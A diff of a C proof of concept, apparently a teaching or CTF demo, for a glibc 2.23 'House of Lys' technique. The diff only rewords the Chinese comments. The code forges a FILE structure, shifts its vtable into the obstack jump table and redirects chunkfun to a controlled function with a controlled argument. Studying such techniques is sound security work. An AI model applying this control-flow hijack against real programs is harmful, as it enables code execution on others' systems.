@@ -1,10 +1,11 @@
 #define _GNU_SOURCE
 
 /*
- * House of Lys 的 shifted obstack vtable，适用于本项目 glibc 2.23 构建。
+ * House of Lys 手法，把 obstack vtable 错位使用，适用于本项目的 glibc
+ * 2.23 构建。
  *
  * 该构建中：_IO_obstack_jumps = _IO_wfile_jumps - 0x1120。
- * 成功效果：错位后的 overflow 槽进入 obstack xsputn，最终调用 chunkfun。
+ * 成功效果：错位后的 overflow 槽会走进 obstack 的 xsputn，最终调用到 chunkfun。
  */
 
 #include <assert.h>
@@ -32,12 +33,12 @@ int main(void)
 {
     setbuf(stdout, NULL);
 
-    /* dlsym 只代替题目中的 libc 泄漏。 */
+    /* 这里用 dlsym 代替题目里通常要做的一次 libc 地址泄漏。 */
     overflow_fn call_overflow = dlsym(RTLD_DEFAULT, "__overflow");
     void *wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
     assert(call_overflow != NULL && wfile_jumps != NULL);
 
-    /* glibc 2.23 目标构建中的固定相对偏移。 */
+    /* 这是 glibc 2.23 目标构建里固定的相对偏移。 */
     uintptr_t obstack_jumps = (uintptr_t)wfile_jumps - 0x1120;
 
     unsigned char fake_file[0x100] __attribute__((aligned(0x10)));
@@ -47,28 +48,28 @@ int main(void)
 
     FILE *fp = (FILE *)fake_file;
 
-    /* 保持窄字符路径，并让 overflow 条件成立。 */
+    /* 保持窄字符路径，并让 overflow 的触发条件成立。 */
     fp->_mode = -1;
     fp->_IO_write_ptr = (char *)1;
     fp->_IO_write_end = (char *)0;
 
-    /* primary vtable 错位 +0x20，使 overflow 槽落到 obstack xsputn。 */
+    /* primary vtable 整体错位 +0x20，让 overflow 槽落到 obstack 的 xsputn 上。 */
     *(void **)(fake_file + 0xd8) = (void *)(obstack_jumps + 0x20);
 
-    /* FILE+0xe0 保存 fake obstack 的指针。 */
+    /* FILE+0xe0 处存的是 fake obstack 的指针。 */
     *(void **)(fake_file + 0xe0) = fake_obstack;
 
-    /* 设置 object_base、next_free 和 chunk_limit，强制进入 _obstack_newchunk。 */
+    /* 设置 object_base、next_free 和 chunk_limit，强制让流程走进 _obstack_newchunk。 */
     fake_obstack[0x10 / 8] = 0;
     fake_obstack[0x18 / 8] = 1;
     fake_obstack[0x20 / 8] = 0;
 
-    /* 把 chunkfun 与 extra_arg 都改成受控值。 */
+    /* 把 chunkfun 和 extra_arg 都改成我们控制的值。 */
     fake_obstack[0x38 / 8] = (uintptr_t)lys_chunkfun;
     fake_obstack[0x48 / 8] = (uintptr_t)&controlled_argument;
     fake_obstack[0x50 / 8] = 1;
 
-    /* 错位后的 xsputn 会把第三参数 rdx 当作长度，因此显式令 rdx=1。 */
+    /* 错位后的 xsputn 会把第三个参数 rdx 当作长度，所以这里显式令 rdx=1。 */
     __asm__ volatile(
         "call *%[target]"
         :
